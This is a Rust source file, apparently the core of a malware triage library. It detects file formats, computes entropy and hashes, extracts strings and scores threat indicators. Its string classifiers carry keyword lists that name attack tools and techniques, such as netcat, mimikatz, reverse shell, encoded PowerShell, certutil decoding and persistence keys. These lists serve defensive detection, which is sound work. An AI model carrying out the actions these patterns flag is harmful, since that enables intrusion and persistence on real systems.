//! `rustre-triage`
//!
//! Triage coordinator —" quick automated analysis to classify a binary and
//! assign an initial threat-level score.

pub mod analyzer_registry;
pub mod heuristic_engine;
pub mod mitre_mapper;
pub mod pe_triage_extended;
pub mod score_aggregator;
pub mod rapid_classifier;
pub mod family_db;
pub mod triage_pipeline;
pub mod file_classifier;
pub mod triage_report;
pub mod malware_classification;
pub mod static_analysis_triage;
pub mod findcrypt;

use std::fmt;
use std::fmt::Write as FmtWrite;
use std::time::Instant;

use rustre_pe_tools::{PeError, PeFile, compute_entropy};
use serde::{Deserialize, Serialize};
use md5::Md5;
use sha2::{Digest, Sha256};
use thiserror::Error;

/// Errors produced by triage operations.
#[derive(Debug, Error)]
pub enum TriageError {
    /// The input buffer is too small to be a valid file.
    #[error("file too small: {0} bytes")]
    TooSmall(usize),
    /// PE parsing failed.
    #[error("pe error: {0}")]
    Pe(#[from] PeError),
    /// I/O error.
    #[error("io: {0}")]
    Io(#[from] std::io::Error),
    /// Generic error.
    #[error("{0}")]
    Other(String),
}

// ---------------------------------------------------------------------------
// FileKind
// ---------------------------------------------------------------------------

/// High-level file-format classification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, Default)]
pub enum FileKind {
    Pe32,
    Pe64,
    Elf32,
    Elf64,
    MachO,
    Apk,
    Dex,
    Zip,
    Pdf,
    Doc,
    Exe,
    Dll,
    Sys,
    #[default]
    Unknown,
}

impl fmt::Display for FileKind {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{self:?}")
    }
}

// ---------------------------------------------------------------------------
// ThreatLevel
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize, Default)]
pub enum ThreatLevel {
    #[default]
    Clean,
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for ThreatLevel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{self:?}")
    }
}

// ---------------------------------------------------------------------------
// TriageIndicator
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TriageIndicator {
    pub name: String,
    pub description: String,
    pub threat_level: ThreatLevel,
    pub category: String,
    pub evidence: String,
}

impl fmt::Display for TriageIndicator {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "[{:?}] {} \u{2014} {}",
            self.threat_level, self.name, self.description
        )
    }
}

// ---------------------------------------------------------------------------
// TriageIndicatorJson (alias for serialization)
// ---------------------------------------------------------------------------

/// JSON-serialisable indicator (same layout as `TriageIndicator`).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TriageIndicatorJson {
    pub name: String,
    pub description: String,
    pub threat_level: String,
    pub category: String,
    pub evidence: String,
}

impl From<&TriageIndicator> for TriageIndicatorJson {
    fn from(i: &TriageIndicator) -> Self {
        Self {
            name: i.name.clone(),
            description: i.description.clone(),
            threat_level: i.threat_level.to_string(),
            category: i.category.clone(),
            evidence: i.evidence.clone(),
        }
    }
}

// ---------------------------------------------------------------------------
// TriageResult
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TriageResult {
    pub file_kind: FileKind,
    pub threat_level: ThreatLevel,
    pub score: u8,
    pub indicators: Vec<TriageIndicator>,
    pub file_size: usize,
    pub sha256: String,
    #[serde(default)]
    pub md5: String,
    pub entropy: f64,
    pub is_packed: bool,
    pub is_obfuscated: bool,
    pub compiler_hint: Option<String>,
    pub analysis_time_ms: u64,
    /// Plain extracted strings (printable ASCII + UTF-16) populated by
    /// `AllStringExtractionStage`. Required for the MCP
    /// `triage_core_run_pipeline` consumer — without it the report had
    /// `strings: []` even though a standalone extractor on the same
    /// bytes finds thousands of valid entries.
    #[serde(default)]
    pub all_strings: Vec<ExtractedString>,
    /// Cryptographic constant hits found by `rustre_crypto_id::scan_binary_for_crypto_constants`.
    /// Empty if the scan stage was not run.
    #[serde(default)]
    pub crypto_hits: Vec<rustre_crypto_id::BinaryCryptoHit>,
}

impl TriageResult {
    #[must_use]
    pub fn new(file_kind: FileKind, data: &[u8]) -> Self {
        let entropy = compute_entropy(data);
        let sha256 = compute_sha256(data);
        let md5 = compute_md5(data);
        Self {
            file_kind,
            threat_level: ThreatLevel::Clean,
            score: 0,
            indicators: Vec::new(),
            file_size: data.len(),
            sha256,
            md5,
            entropy,
            is_packed: false,
            is_obfuscated: false,
            compiler_hint: None,
            analysis_time_ms: 0,
            all_strings: Vec::new(),
            crypto_hits: Vec::new(),
        }
    }

    pub fn add_indicator(&mut self, indicator: TriageIndicator) {
        let delta: u8 = match indicator.threat_level {
            ThreatLevel::Clean => 0,
            ThreatLevel::Informational => 2,
            ThreatLevel::Low => 10,
            ThreatLevel::Medium => 20,
            ThreatLevel::High => 35,
            ThreatLevel::Critical => 50,
        };
        self.score = self.score.saturating_add(delta).min(100);
        if indicator.threat_level > self.threat_level {
            self.threat_level = indicator.threat_level;
        }
        self.indicators.push(indicator);
    }

    #[must_use]
    pub fn is_malicious(&self) -> bool {
        self.threat_level >= ThreatLevel::High
    }

    /// Build a full JSON report from this result plus any suspicious strings.
    #[must_use]
    pub fn to_report(&self, strings: Vec<SuspiciousString>) -> TriageReport {
        TriageReport {
            file_kind: self.file_kind.to_string(),
            threat_level: self.threat_level.to_string(),
            score: self.score,
            is_packed: self.is_packed,
            is_obfuscated: self.is_obfuscated,
            compiler_hint: self.compiler_hint.clone(),
            sha256: self.sha256.clone(),
            md5: self.md5.clone(),
            file_size: self.file_size,
            entropy: self.entropy,
            indicators: self
                .indicators
                .iter()
                .map(TriageIndicatorJson::from)
                .collect(),
            strings,
            analysis_time_ms: self.analysis_time_ms,
            all_strings: self.all_strings.clone(),
            crypto_hits: self.crypto_hits.clone(),
        }
    }

    /// Serialise to pretty-printed JSON.
    ///
    /// # Errors
    ///
    /// Returns an error if serialisation fails.
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }
}

impl fmt::Display for TriageResult {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "Triage [{:?}] threat={} score={} packed={}",
            self.file_kind, self.threat_level, self.score, self.is_packed
        )
    }
}

// ---------------------------------------------------------------------------
// TriageReport
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TriageReport {
    pub file_kind: String,
    pub threat_level: String,
    pub score: u8,
    pub is_packed: bool,
    pub is_obfuscated: bool,
    pub compiler_hint: Option<String>,
    pub sha256: String,
    #[serde(default)]
    pub md5: String,
    pub file_size: usize,
    pub entropy: f64,
    pub indicators: Vec<TriageIndicatorJson>,
    pub strings: Vec<SuspiciousString>,
    pub analysis_time_ms: u64,
    /// All printable strings extracted from the image (not just suspicious
    /// ones). Populated by the pipeline's `AllStringExtractionStage`.
    /// Matches what the standalone `triage_core_extract_strings` tool
    /// produces. Empty if the stage was skipped.
    #[serde(default)]
    pub all_strings: Vec<ExtractedString>,
    /// Cryptographic constant hits. Populated by `CryptoConstantScanStage`.
    #[serde(default)]
    pub crypto_hits: Vec<rustre_crypto_id::BinaryCryptoHit>,
}

impl TriageReport {
    /// Return a human-readable text summary of this report.
    #[must_use]
    pub fn render_text(&self) -> String {
        let mut out = String::new();
        let arch = self.compiler_hint.as_deref().unwrap_or("unknown");
        let _ = writeln!(out, "=== Triage Report ===");
        let _ = writeln!(out, "File type    : {}", self.file_kind);
        let _ = writeln!(out, "Architecture : {arch}");
        let _ = writeln!(out, "Compiler     : {arch}");
        let _ = writeln!(out, "Packed       : {}", self.is_packed);
        let _ = writeln!(out, "Obfuscated   : {}", self.is_obfuscated);
        let _ = writeln!(out, "Threat level : {}", self.threat_level);
        let _ = writeln!(out, "Threat score : {}/100", self.score);
        let _ = writeln!(out, "SHA-256      : {}", self.sha256);
        let _ = writeln!(out, "MD5          : {}", self.md5);
        let _ = writeln!(out, "File size    : {} bytes", self.file_size);
        let _ = writeln!(out, "Entropy      : {:.3}", self.entropy);
        let _ = writeln!(out, "Analysis ms  : {}", self.analysis_time_ms);
        if !self.indicators.is_empty() {
            out.push_str("\n--- Indicators ---\n");
            for ind in &self.indicators {
                let _ = writeln!(out, "  [{:12}] {:30} | {}", ind.threat_level, ind.name, ind.description);
            }
        }
        if !self.strings.is_empty() {
            out.push_str("\n--- Suspicious Strings ---\n");
            for s in &self.strings {
                let preview: String = s.string.value.chars().take(60).collect();
                let _ = writeln!(out, "  [{:?}] {:?} @ 0x{:x} | {}", s.threat_level, s.category, s.string.offset, preview);
            }
        }
        out
    }

    /// Return a machine-readable JSON string of this report.
    ///
    /// # Errors
    ///
    /// Returns a `serde_json` error if serialisation fails (practically
    /// infallible for this type).
    pub fn render_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }
}

// ---------------------------------------------------------------------------
// TriageFinding —" a lightweight finding consumed by ThreatScorer
// ---------------------------------------------------------------------------

/// A lightweight finding produced by any analysis step and consumed by
/// [`ThreatScorer`] to compute the aggregate threat score.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TriageFinding {
    /// Short identifier such as `"packed"`, `"network"`, `"exploit"`.
    pub kind: String,
    /// Human-readable description.
    pub description: String,
}

impl TriageFinding {
    /// Create a new finding.
    #[must_use]
    pub fn new(kind: impl Into<String>, description: impl Into<String>) -> Self {
        Self {
            kind: kind.into(),
            description: description.into(),
        }
    }
}

// ---------------------------------------------------------------------------
// ThreatScorer
// ---------------------------------------------------------------------------

/// Deprecated standalone scorer kept for backwards compatibility.
///
/// The authoritative scoring path is [`TriageResult::add_indicator`], which
/// uses `ThreatLevel`-based weights. `ThreatScorer::score` is now a thin
/// adapter that maps each finding to a `ThreatLevel` (mirroring the mapping
/// used in [`TriagePipeline::run`]) and routes through the same `add_indicator`
/// logic, ensuring both code paths produce identical scores.
pub struct ThreatScorer;

impl ThreatScorer {
    /// Compute a clamped 0-100 score from the supplied findings.
    ///
    /// Routes through [`TriageResult::add_indicator`] so the score matches
    /// what [`TriagePipeline::run`] would produce for the same findings.
    #[must_use]
    pub fn score(findings: &[TriageFinding]) -> u32 {
        let mut result = TriageResult::new(FileKind::Unknown, &[]);
        for f in findings {
            let kind: &str = &f.kind;
            let threat_level = match kind {
                "exploit" | "shellcode" => ThreatLevel::Critical,
                "packed" | "obfuscated" => ThreatLevel::Medium,
                "network" => ThreatLevel::Low,
                _ => ThreatLevel::Informational,
            };
            result.add_indicator(TriageIndicator {
                name: f.kind.clone(),
                description: f.description.clone(),
                threat_level,
                category: f.kind.clone(),
                evidence: String::new(),
            });
        }
        u32::from(result.score)
    }
}

// ---------------------------------------------------------------------------
// TriagePlugin —" trait implemented by each analysis plug-in
// ---------------------------------------------------------------------------

/// A plug-in that can inspect raw file bytes and produce a set of
/// [`TriageFinding`]s.
pub trait TriagePlugin: Send + Sync {
    /// Run analysis on `bytes` and return any findings.
    fn analyze(&self, bytes: &[u8]) -> Vec<TriageFinding>;

    /// Short display name for this plug-in.
    fn name(&self) -> &str;
}

// ---------------------------------------------------------------------------
// TriagePipeline
// ---------------------------------------------------------------------------

/// Chains multiple [`TriagePlugin`] instances and merges their findings into
/// a single [`TriageReport`].
///
/// ```
/// use rustre_triage::{TriageFinding, TriagePipeline, TriagePlugin};
///
/// struct MarkerPlugin;
///
/// impl TriagePlugin for MarkerPlugin {
///     fn analyze(&self, bytes: &[u8]) -> Vec<TriageFinding> {
///         if bytes.starts_with(b"MZ") {
///             vec![TriageFinding::new("pe-magic", "MZ header present")]
///         } else {
///             Vec::new()
///         }
///     }
///     fn name(&self) -> &str {
///         "marker"
///     }
/// }
///
/// let mut pipeline = TriagePipeline::new();
/// pipeline.add_plugin(Box::new(MarkerPlugin));
///
/// let report = pipeline.run(b"MZ this buffer starts with the PE magic");
/// assert!(!report.render_text().is_empty());
/// ```
///
/// The example was `rust,ignore` until 2026-07-29 and referred to a `MyPlugin`
/// that exists nowhere, so it showed no way to actually implement the
/// extension point. It now defines a real plug-in.
pub struct TriagePipeline {
    plugins: Vec<Box<dyn TriagePlugin>>,
}

impl TriagePipeline {
    /// Create an empty pipeline.
    #[must_use]
    pub fn new() -> Self {
        Self {
            plugins: Vec::new(),
        }
    }

    /// Add a plug-in to the end of the pipeline.
    pub fn add_plugin(&mut self, p: Box<dyn TriagePlugin>) {
        self.plugins.push(p);
    }

    /// Run all plug-ins against `bytes`, merge their findings, compute a
    /// threat score via [`TriageResult::add_indicator`], and return a
    /// [`TriageReport`].
    ///
    /// The report fields are populated as follows:
    /// - `file_type` — determined by [`detect_file_kind`]
    /// - `packer` — `true` if any finding has kind `"packed"`
    /// - `obfuscation` — `true` if any finding has kind `"obfuscated"`
    /// - `threat_score` — accumulated by `TriageResult::add_indicator` using
    ///   `ThreatLevel`-based weights (the single authoritative scoring path)
    #[must_use]
    pub fn run(&self, bytes: &[u8]) -> TriageReport {
        let file_kind = detect_file_kind(bytes);
        let mut result = TriageResult::new(file_kind, bytes);

        for plugin in &self.plugins {
            let findings = plugin.analyze(bytes);
            for f in findings {
                let kind: &str = &f.kind;
                let threat_level = match kind {
                    "exploit" | "shellcode" => ThreatLevel::Critical,
                    "packed" | "obfuscated" => ThreatLevel::Medium,
                    "network" => ThreatLevel::Low,
                    _ => ThreatLevel::Informational,
                };
                if kind == "packed" {
                    result.is_packed = true;
                }
                if kind == "obfuscated" {
                    result.is_obfuscated = true;
                }
                result.add_indicator(TriageIndicator {
                    name: f.kind.clone(),
                    description: f.description.clone(),
                    threat_level,
                    category: f.kind.clone(),
                    evidence: String::new(),
                });
            }
        }

        result.to_report(Vec::new())
    }
}

impl Default for TriagePipeline {
    fn default() -> Self {
        Self::new()
    }
}

impl fmt::Debug for TriagePipeline {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "TriagePipeline({} plugins)", self.plugins.len())
    }
}

// ---------------------------------------------------------------------------
// TriageConfig
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
pub struct TriageConfig {
    pub max_string_scan_size: usize,
    pub min_string_length: usize,
    /// Analysis feature flags — use accessor methods.
    pub analysis_flags: u8,
    pub max_indicators: usize,
}

impl TriageConfig {
    pub const FLAG_STRING_HEURISTICS: u8 = 0x01;
    pub const FLAG_ELF:               u8 = 0x02;
    pub const FLAG_MACHO:             u8 = 0x04;
    pub const FLAG_PE:                u8 = 0x08;
    pub const FLAG_SCRIPT:            u8 = 0x10;
    pub const ALL_FLAGS: u8 = Self::FLAG_STRING_HEURISTICS | Self::FLAG_ELF
        | Self::FLAG_MACHO | Self::FLAG_PE | Self::FLAG_SCRIPT;

    #[must_use] pub const fn string_heuristics(&self) -> bool { self.analysis_flags & Self::FLAG_STRING_HEURISTICS != 0 }
    #[must_use] pub const fn elf_analysis(&self) -> bool { self.analysis_flags & Self::FLAG_ELF != 0 }
    #[must_use] pub const fn macho_analysis(&self) -> bool { self.analysis_flags & Self::FLAG_MACHO != 0 }
    #[must_use] pub const fn pe_analysis(&self) -> bool { self.analysis_flags & Self::FLAG_PE != 0 }
    #[must_use] pub const fn script_analysis(&self) -> bool { self.analysis_flags & Self::FLAG_SCRIPT != 0 }
}

impl Default for TriageConfig {
    fn default() -> Self {
        Self {
            max_string_scan_size: 16 * 1024 * 1024, // 16 MiB
            min_string_length: 6,
            analysis_flags: Self::ALL_FLAGS,
            max_indicators: 512,
        }
    }
}

// ---------------------------------------------------------------------------
// detect_file_kind
// ---------------------------------------------------------------------------

#[must_use]
pub fn detect_file_kind(data: &[u8]) -> FileKind {
    if data.len() < 4 {
        return FileKind::Unknown;
    }
    match &data[0..4] {
        [0x4D, 0x5A, _, _] => {
            let pe_off = if data.len() >= 64 {
                u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize
            } else {
                // Too small to contain the e_lfanew field at offset 60 — classify
                // conservatively as Pe32 without peeking at the optional header.
                return FileKind::Pe32;
            };
            if pe_off + 26 <= data.len() {
                let magic = u16::from_le_bytes([data[pe_off + 24], data[pe_off + 25]]);
                if magic == 0x020B {
                    FileKind::Pe64
                } else {
                    FileKind::Pe32
                }
            } else {
                // Optional header not reachable — fall back without guessing.
                FileKind::Pe32
            }
        }
        [0x7F, 0x45, 0x4C, 0x46] => {
            if data.get(4) == Some(&2) {
                FileKind::Elf64
            } else {
                FileKind::Elf32
            }
        }
        [0xCE | 0xCF, 0xFA, 0xED, 0xFE] | [0xFE, 0xED, 0xFA, 0xCE | 0xCF] => FileKind::MachO,
        [0x50, 0x4B, 0x03, 0x04] => {
            if data.windows(8).any(|w| w == b"classes.") {
                FileKind::Apk
            } else {
                FileKind::Zip
            }
        }
        [0x64, 0x65, 0x78, 0x0A] => FileKind::Dex,
        [0x25, 0x50, 0x44, 0x46] => FileKind::Pdf,
        [0xD0, 0xCF, 0x11, 0xE0] => FileKind::Doc,
        _ => FileKind::Unknown,
    }
}

// ---------------------------------------------------------------------------
// String types
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum StringEncoding {
    Ascii,
    Utf16Le,
    Utf16Be,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExtractedString {
    pub value: String,
    pub offset: u64,
    pub encoding: StringEncoding,
    /// Virtual address of this string, if section information was supplied.
    pub va: Option<u64>,
}

/// Describes a binary section for virtual-address translation.
#[derive(Debug, Clone, Copy)]
pub struct SectionDescriptor {
    pub raw_offset: u64,
    pub raw_size: u64,
    pub virtual_addr: u64,
    pub image_base: u64,
}

/// Simplified section descriptor used by [`StringHeuristics::extract_strings_with_sections`].
#[derive(Debug, Clone, Copy)]
pub struct SectionInfo {
    /// Raw (file) offset of the section.
    pub file_offset: u64,
    /// Raw size of the section in bytes.
    pub file_size: u64,
    /// Absolute virtual address of the section start.
    pub virtual_address: u64,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum StringCategory {
    NetworkUrl,
    IpAddress,
    RegistryKey,
    FilePath,
    CommandLine,
    CryptoKey,
    Base64Payload,
    MalwareFamily,
    HackingTool,
    AntiAnalysis,
    Persistence,
    Obfuscation,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuspiciousString {
    pub string: ExtractedString,
    pub category: StringCategory,
    pub threat_level: ThreatLevel,
}

// ---------------------------------------------------------------------------
// Entropy per section
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum EntropyRating {
    VeryLow,
    Low,
    Normal,
    High,
    VeryHigh,
}

impl EntropyRating {
    #[must_use]
    pub fn from_entropy(e: f64) -> Self {
        if e < 1.0 {
            Self::VeryLow
        } else if e < 4.0 {
            Self::Low
        } else if e < 6.5 {
            Self::Normal
        } else if e < 7.2 {
            Self::High
        } else {
            Self::VeryHigh
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SectionEntropy {
    pub name: String,
    pub offset: u64,
    pub size: usize,
    pub entropy: f64,
    pub rating: EntropyRating,
}

/// Slice data into 4 KiB blocks, compute entropy per block, and return a vec.
#[must_use]
pub fn analyze_section_entropy(data: &[u8]) -> Vec<SectionEntropy> {
    const BLOCK: usize = 4096;
    let mut out = Vec::new();
    let mut offset = 0usize;
    for (i, chunk) in data.chunks(BLOCK).enumerate() {
        let e = compute_entropy(chunk);
        out.push(SectionEntropy {
            name: format!("block_{i}"),
            offset: offset as u64,
            size: chunk.len(),
            entropy: e,
            rating: EntropyRating::from_entropy(e),
        });
        offset += chunk.len();
    }
    out
}

// ---------------------------------------------------------------------------
// StringHeuristics
// ---------------------------------------------------------------------------

pub struct StringHeuristics;

impl StringHeuristics {
    /// Extract printable ASCII strings of at least `min_len` bytes.
    #[must_use]
    pub fn extract_strings(data: &[u8], min_len: usize) -> Vec<ExtractedString> {
        let mut result = Vec::new();
        let mut start: Option<usize> = None;

        for (i, &b) in data.iter().enumerate() {
            if b.is_ascii_graphic() || b == b' ' {
                if start.is_none() {
                    start = Some(i);
                }
            } else if let Some(s) = start.take() {
                let len = i - s;
                if len >= min_len
                    && let Ok(val) = std::str::from_utf8(&data[s..i])
                {
                    result.push(ExtractedString {
                        value: val.to_string(),
                        offset: s as u64,
                        encoding: StringEncoding::Ascii,
                        va: None,
                    });
                }
            }
        }
        // flush trailing
        if let Some(s) = start {
            let len = data.len() - s;
            if len >= min_len
                && let Ok(val) = std::str::from_utf8(&data[s..])
            {
                result.push(ExtractedString {
                    value: val.to_string(),
                    offset: s as u64,
                    encoding: StringEncoding::Ascii,
                    va: None,
                });
            }
        }

        // UTF-16 LE pass
        let utf16_strings = Self::extract_utf16le(data, min_len);
        result.extend(utf16_strings);

        result.sort_by_key(|s| s.offset);
        result
    }

    /// Like [`Self::extract_strings`] but also resolves each hit's file offset
    /// to a virtual address using `sections`.  Hits whose offset falls outside
    /// every section keep `va: None`.
    #[must_use]
    pub fn extract_strings_with_va(
        data: &[u8],
        min_len: usize,
        sections: &[SectionDescriptor],
    ) -> Vec<ExtractedString> {
        let mut hits = Self::extract_strings(data, min_len);
        for hit in &mut hits {
            for sec in sections {
                if hit.offset >= sec.raw_offset
                    && hit.offset < sec.raw_offset.saturating_add(sec.raw_size)
                {
                    let rva = sec.virtual_addr + (hit.offset - sec.raw_offset);
                    hit.va = Some(sec.image_base + rva);
                    break;
                }
            }
        }
        hits
    }

    /// Extract strings using a list of section descriptors with the simpler
    /// `(file_offset, file_size, virtual_address)` tuple shape.
    ///
    /// `virtual_address` is treated as the absolute VA of the section start;
    /// each hit's `va` is computed as `virtual_address + (offset - file_offset)`.
    #[must_use]
    pub fn extract_strings_with_sections(
        data: &[u8],
        min_len: usize,
        sections: &[SectionInfo],
    ) -> Vec<ExtractedString> {
        let descriptors: Vec<SectionDescriptor> = sections
            .iter()
            .map(|s| SectionDescriptor {
                raw_offset: s.file_offset,
                raw_size: s.file_size,
                virtual_addr: s.virtual_address,
                image_base: 0,
            })
            .collect();
        Self::extract_strings_with_va(data, min_len, &descriptors)
    }

    /// Read a PE file from disk, parse it, and extract strings with proper VAs.
    ///
    /// # Errors
    /// Returns a [`TriageError`] if reading or PE parsing fails.
    pub fn extract_strings_from_pe(
        path: &std::path::Path,
        min_len: usize,
    ) -> std::result::Result<Vec<ExtractedString>, TriageError> {
        let data = std::fs::read(path)?;
        Ok(Self::extract_strings_auto_va(&data, min_len))
    }

    /// Extract strings, auto-detecting PE format to populate per-hit VAs.
    /// Falls back to `extract_strings` (va = None) for non-PE inputs.
    #[must_use]
    pub fn extract_strings_auto_va(data: &[u8], min_len: usize) -> Vec<ExtractedString> {
        if let Ok(info) = rustre_loader_pe::PeInfo::parse(data) {
            let sections: Vec<SectionDescriptor> = info
                .sections
                .iter()
                .map(|s| SectionDescriptor {
                    raw_offset: u64::from(s.raw_offset),
                    raw_size: u64::from(s.raw_size),
                    virtual_addr: s.virtual_address.saturating_sub(info.image_base),
                    image_base: info.image_base,
                })
                .collect();
            return Self::extract_strings_with_va(data, min_len, &sections);
        }
        Self::extract_strings(data, min_len)
    }

    fn extract_utf16le(data: &[u8], min_len: usize) -> Vec<ExtractedString> {
        let mut result = Vec::new();
        if data.len() < 2 {
            return result;
        }
        let mut current = String::new();
        let mut start_offset: Option<usize> = None;

        let mut i = 0usize;
        while i + 1 < data.len() {
            let lo = data[i];
            let hi = data[i + 1];
            let codepoint = u16::from_le_bytes([lo, hi]);
            if (0x20..0x7F).contains(&codepoint) {
                if start_offset.is_none() {
                    start_offset = Some(i);
                }
                current.push(char::from(lo));
                i += 2;
            } else {
                if let Some(off) = start_offset.take()
                    && current.len() >= min_len
                {
                    result.push(ExtractedString {
                        value: current.clone(),
                        offset: off as u64,
                        encoding: StringEncoding::Utf16Le,
                        va: None,
                    });
                }
                current.clear();
                i += 1;
            }
        }
        if let Some(off) = start_offset
            && current.len() >= min_len
        {
            result.push(ExtractedString {
                value: current,
                offset: off as u64,
                encoding: StringEncoding::Utf16Le,
                va: None,
            });
        }
        result
    }

    /// Classify a list of extracted strings and return the suspicious ones.
    #[must_use]
    pub fn classify(strings: &[ExtractedString]) -> Vec<SuspiciousString> {
        let mut out = Vec::new();
        for s in strings {
            let v = s.value.as_str();
            if let Some((cat, lvl)) = Self::classify_one(v) {
                out.push(SuspiciousString {
                    string: s.clone(),
                    category: cat,
                    threat_level: lvl,
                });
            }
        }
        out
    }

    fn classify_one(v: &str) -> Option<(StringCategory, ThreatLevel)> {
        let lower = v.to_ascii_lowercase();
        Self::classify_structural(v, &lower)
            .or_else(|| Self::classify_threat_terms(&lower))
            .or_else(|| Self::classify_command_patterns(&lower))
    }

    fn classify_structural(v: &str, lower: &str) -> Option<(StringCategory, ThreatLevel)> {
        // Network URLs.
        //
        // `contains`, not `starts_with`: extracted strings are runs of printable
        // bytes, and a URL is nearly always embedded in surrounding text rather
        // than sitting at the start of its own run. Before 2026-07-29 this used
        // `starts_with`, so `"Loading http://host/payload.exe from server"` —
        // one extracted string — was not recognised as containing a URL at all.
        // A scheme marker is unambiguous wherever it appears.
        if lower.contains("http://") || lower.contains("https://") || lower.contains("ftp://") {
            return Some((StringCategory::NetworkUrl, ThreatLevel::Low));
        }
        // IPv4
        if is_ipv4(v) {
            return Some((StringCategory::IpAddress, ThreatLevel::Low));
        }
        // Registry keys
        if lower.starts_with("hkey_")
            || lower.contains("software\\microsoft\\")
            || lower.contains("currentversion\\run")
        {
            return Some((StringCategory::RegistryKey, ThreatLevel::Medium));
        }
        // Crypto keys
        if v.contains("-----BEGIN RSA PRIVATE KEY-----")
            || v.contains("-----BEGIN PRIVATE KEY-----")
            || v.contains("-----BEGIN CERTIFICATE-----")
        {
            return Some((StringCategory::CryptoKey, ThreatLevel::High));
        }
        // Obfuscation / base64 payloads
        if is_likely_base64(v) {
            return Some((StringCategory::Base64Payload, ThreatLevel::Low));
        }
        // File path patterns pointing to system areas
        if lower.contains("\\windows\\temp\\")
            || lower.contains("\\appdata\\roaming\\")
            || lower.contains("/tmp/.")
        {
            return Some((StringCategory::FilePath, ThreatLevel::Low));
        }
        None
    }

    fn classify_threat_terms(lower: &str) -> Option<(StringCategory, ThreatLevel)> {
        const ANTI_ANALYSIS: &[&str] = &[
            "virtualbox", "vmware", "sandboxie", "wireshark", "x64dbg",
            "ollydbg", "procmon", "processhacker", "fakenet", "cuckoo",
            "anubis", "joebox", "threatexpert", "cwsandbox", "comodo",
        ];
        const PERSISTENCE: &[&str] = &[
            "currentversion\\run", "runonce", "startup", "schtasks",
            "register-scheduledtask", "sc create", "sc.exe",
        ];
        const MALWARE: &[&str] = &[
            "meterpreter", "metasploit", "mimikatz", "cobalt strike",
            "cobaltstrike", "empire", "powersploit", "invoke-mimikatz",
            "invoke-shellcode", "invoke-reflectivepeinjection",
        ];
        const HACKING: &[&str] = &[
            "nmap", "masscan", "netcat", "ncat", "sqlmap",
            "hydra", "hashcat", "john the ripper", "aircrack",
        ];
        const C2: &[&str] = &[
            "beacon", "callback", "gethost", "c2server",
            "command and control", "reverse shell", "bind shell", "shellcode",
        ];
        if ANTI_ANALYSIS.iter().any(|t| lower.contains(t)) {
            return Some((StringCategory::AntiAnalysis, ThreatLevel::Medium));
        }
        if PERSISTENCE.iter().any(|t| lower.contains(t)) {
            return Some((StringCategory::Persistence, ThreatLevel::Medium));
        }
        if MALWARE.iter().any(|t| lower.contains(t)) {
            return Some((StringCategory::MalwareFamily, ThreatLevel::Critical));
        }
        if HACKING.iter().any(|t| lower.contains(t)) {
            return Some((StringCategory::HackingTool, ThreatLevel::Medium));
        }
        if C2.iter().any(|t| lower.contains(t)) {
            return Some((StringCategory::NetworkUrl, ThreatLevel::High));
        }
        None
    }

    fn classify_command_patterns(lower: &str) -> Option<(StringCategory, ThreatLevel)> {
        const CMD_TERMS: &[&str] = &[
            "cmd /c", "cmd.exe /c", "powershell -enc", "powershell -e ",
            "powershell -nop", "wscript.exe", "cscript.exe", "regsvr32",
            "rundll32", "mshta.exe", "certutil -decode", "bitsadmin",
        ];
        if CMD_TERMS.iter().any(|t| lower.contains(t)) {
            return Some((StringCategory::CommandLine, ThreatLevel::Medium));
        }
        None
    }
}

fn is_ipv4(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 4 {
        return false;
    }
    parts.iter().all(|p| p.parse::<u8>().is_ok())
}

fn is_likely_base64(s: &str) -> bool {
    if s.len() < 32 {
        return false;
    }
    let base64_chars = s
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=');
    if !base64_chars {
        return false;
    }
    // ends with = padding
    s.ends_with('=') && s.len().is_multiple_of(4)
}

// ---------------------------------------------------------------------------
// ElfTriageAnalyzer — module-level byte readers (no cast lints)
// ---------------------------------------------------------------------------

fn elf_u16(data: &[u8], off: usize, is_le: bool) -> u16 {
    if off + 2 > data.len() { return 0; }
    if is_le { u16::from_le_bytes([data[off], data[off + 1]]) }
    else      { u16::from_be_bytes([data[off], data[off + 1]]) }
}

fn elf_u32(data: &[u8], off: usize, is_le: bool) -> u32 {
    if off + 4 > data.len() { return 0; }
    if is_le { u32::from_le_bytes([data[off], data[off+1], data[off+2], data[off+3]]) }
    else      { u32::from_be_bytes([data[off], data[off+1], data[off+2], data[off+3]]) }
}

fn elf_u64(data: &[u8], off: usize, is_le: bool) -> u64 {
    if off + 8 > data.len() { return 0; }
    let b = [data[off],data[off+1],data[off+2],data[off+3],
             data[off+4],data[off+5],data[off+6],data[off+7]];
    if is_le { u64::from_le_bytes(b) } else { u64::from_be_bytes(b) }
}

